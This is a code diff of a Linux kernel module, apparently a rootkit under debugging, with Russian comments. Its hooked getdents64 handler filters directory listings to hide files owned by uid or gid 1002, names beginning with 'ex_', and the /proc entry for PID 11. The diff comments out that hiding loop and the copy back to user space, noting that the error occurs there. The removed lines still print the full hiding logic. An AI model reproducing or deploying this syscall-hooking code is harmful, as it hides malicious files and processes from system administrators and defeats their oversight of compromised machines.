@@ -9,10 +9,10 @@
 
 static asmlinkage long ex_sys_getdents64(struct pt_regs *regs)
 {   
-    struct linux_dirent64 *kdirp, *ndirp;
+    struct linux_dirent64 *kdirp; //, *ndirp;
     unsigned short is_proc = 0;                 // фс это /proc ?
     struct inode *d_inode;
-	unsigned long offset = 0;                   // смещение в массиве
+	// unsigned long offset = 0;                   // смещение в массиве
 
     int fd = (int) regs->di;                                            // 1 парам
     struct linux_dirent64 *dirp = (struct linux_dirent64*) regs->si;    // 2 парам
@@ -53,52 +53,56 @@ static asmlinkage long ex_sys_getdents64(struct pt_regs *regs)
         is_proc = 1;
     }
 
-	while (offset < ret)
-	{
-		ndirp = (void *)kdirp + offset;
-		unsigned short d_reclen = ndirp->d_reclen;
+    /*
+        Вот здесь ошибка возникает
+    */
 
-		// фильтруем по uid gid подстроке или по pid
-		if (({
-                // Поиск inode файла по его номеру (ndirp->d_ino) в фс, описанной суперблоком (d_inode->i_sb)
+	// while (offset < ret)
+	// {
+	// 	ndirp = (void *)kdirp + offset;
+	// 	unsigned short d_reclen = ndirp->d_reclen;
 
-                struct inode *n_inode;
-                struct list_head *pos;
-                bool is_find = false;
+	// 	// фильтруем по uid gid подстроке или по pid
+	// 	if (({
+    //             // Поиск inode файла по его номеру (ndirp->d_ino) в фс, описанной суперблоком (d_inode->i_sb)
 
-                list_for_each(pos, &d_inode->i_sb->s_inodes) {
-                    n_inode = list_entry(pos, struct inode, i_sb_list);
-                    if (n_inode->i_ino == ndirp->d_ino) {
-                        is_find = true;
-                        break;
-                    }
-                }
+    //             struct inode *n_inode;
+    //             struct list_head *pos;
+    //             bool is_find = false;
 
-                int res = is_find && (
-                    (n_inode->i_uid.val == 1002 || n_inode->i_gid.val == 1002) || 
-                    strncmp(ndirp->d_name, "ex_", strlen("ex_")) == 0
-                    );
+    //             list_for_each(pos, &d_inode->i_sb->s_inodes) {
+    //                 n_inode = list_entry(pos, struct inode, i_sb_list);
+    //                 if (n_inode->i_ino == ndirp->d_ino) {
+    //                     is_find = true;
+    //                     break;
+    //                 }
+    //             }
 
-                res;
-            }) || (is_proc && !strcmp(ndirp->d_name, "11"))) {
-			/*
-				ndirp  								                текущее положение в массиве
-				(char *)ndirp + d_reclen 					        следующий элемент массива
-				(char *)kdirp + ret - ((char *)ndirp + d_reclen) 	колво байт до конца массива с начала след эл
-			*/
-			memmove(ndirp, (char *)ndirp + d_reclen, (char *)kdirp + ret - ((char *)ndirp + d_reclen));
-			ret -= d_reclen;
-			memset((char *)kdirp + ret, 0, d_reclen);
+    //             int res = is_find && (
+    //                 (n_inode->i_uid.val == 1002 || n_inode->i_gid.val == 1002) || 
+    //                 strncmp(ndirp->d_name, "ex_", strlen("ex_")) == 0
+    //                 );
+
+    //             res;
+    //         }) || (is_proc && !strcmp(ndirp->d_name, "11"))) {
+	// 		/*
+	// 			ndirp  								                текущее положение в массиве
+	// 			(char *)ndirp + d_reclen 					        следующий элемент массива
+	// 			(char *)kdirp + ret - ((char *)ndirp + d_reclen) 	колво байт до конца массива с начала след эл
+	// 		*/
+	// 		memmove(ndirp, (char *)ndirp + d_reclen, (char *)kdirp + ret - ((char *)ndirp + d_reclen));
+	// 		ret -= d_reclen;
+	// 		memset((char *)kdirp + ret, 0, d_reclen);
             
-			continue;
-		}
+	// 		continue;
+	// 	}
 
-		offset += d_reclen;
-	}
+	// 	offset += d_reclen;
+	// }
 	
-	if (copy_to_user(dirp, kdirp, ret)) {
-		goto out;
-	}
+	// if (copy_to_user(dirp, kdirp, ret)) {
+	// 	goto out;
+	// }
 
 out:
     kfree(kdirp);
